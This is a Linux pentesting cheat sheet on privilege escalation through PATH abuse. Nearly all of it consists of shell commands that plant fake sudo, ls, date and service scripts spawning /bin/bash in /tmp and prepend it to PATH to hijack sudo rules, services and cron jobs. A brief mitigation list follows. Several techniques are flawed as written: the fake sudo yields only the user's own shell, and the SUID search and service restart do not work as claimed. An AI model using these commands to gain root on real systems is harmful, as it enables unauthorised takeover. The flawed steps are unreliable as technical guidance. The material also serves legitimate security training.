---
title: Linux Path Abuse
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - linux
---
# Path abuse Cheatsheet

## PATH Abuse Privilege Escalation
This cheat sheet provides actionable steps to escalate privileges using PATH abuse.  [PATH](http://www.linfo.org/path_env_var.html) is an environment variable that specifies the set of directories where an executable can be located.

```shell-session
echo $PATH  # Display the current PATH variable
```

### Modifying PATH for Command Hijacking

```shell-session
# Adding the current directory (.) to PATH
PATH=.:${PATH}
export PATH
echo $PATH  # Confirm the updated PATH
```

By adding `.` to `PATH`, any command executed without an absolute path will first search the current directory. If an attacker can place a malicious script in a writable directory that appears first in the `PATH`, they can hijack legitimate commands and escalate privileges.

---

## Exploitation Techniques

### 1. Overwriting Commonly Used Commands

```shell-session
# Check if a writable directory exists in PATH
find ${PATH//:/ } -writable 2>/dev/null

# Create a fake sudo command
cat <<EOF > /tmp/sudo
#!/bin/bash
/bin/bash
EOF
chmod +x /tmp/sudo
export PATH=/tmp:$PATH

# If the user runs sudo, they will execute our malicious script
sudo
```

### 2. Hijacking Root-Executed Scripts

```shell-session
# Find scripts executed by root that do not use absolute paths
find / -type f -user root -perm -4000 2>/dev/null | grep -vE "(/bin/|/sbin/|/usr/bin/|/usr/sbin/)"

# If a script calls an executable without an absolute path, we can replace it with a malicious version
cat <<EOF > /tmp/ls
#!/bin/bash
/bin/bash
EOF
chmod +x /tmp/ls
export PATH=/tmp:$PATH

# If a root-executed script runs `ls`, it will launch a root shell
ls
```

### 3. Finding Sudo Vulnerabilities

```shell-session
# Check if a user can run commands with sudo without specifying the full path
sudo -l

# If the output contains (ALL) NOPASSWD and does not use absolute paths, create a malicious version of the allowed command
cat <<EOF > /tmp/vulnerable_command
#!/bin/bash
/bin/bash
EOF
chmod +x /tmp/vulnerable_command
export PATH=/tmp:$PATH

# Run the allowed command via sudo
sudo vulnerable_command
```

### 4. Abusing System Services

```shell-session
# Check for system services that execute user-controlled scripts
find /etc/systemd/system /lib/systemd/system -type f -writable 2>/dev/null

# If a writable service executes a script without an absolute path, modify it
cat <<EOF > /tmp/system_script
#!/bin/bash
/bin/bash
EOF
chmod +x /tmp/system_script
export PATH=/tmp:$PATH

# Restart the service and gain a shell
systemctl restart vulnerable_service
```

### 5. Exploiting Cron Jobs

```shell-session
# Find cron jobs owned by root
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/crontabs

# If a script runs without an absolute path, replace the executable
cat <<EOF > /tmp/date
#!/bin/bash
/bin/bash
EOF
chmod +x /tmp/date
export PATH=/tmp:$PATH

# Wait for the cron job to execute
```

---

## Mitigation

- Avoid adding `.` to the `PATH` variable
- Always use absolute paths in scripts executed with elevated privileges
- Restrict writable permissions on directories included in `PATH`
- Use `secure_path` in `sudoers` to enforce absolute paths

```shell-session
Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

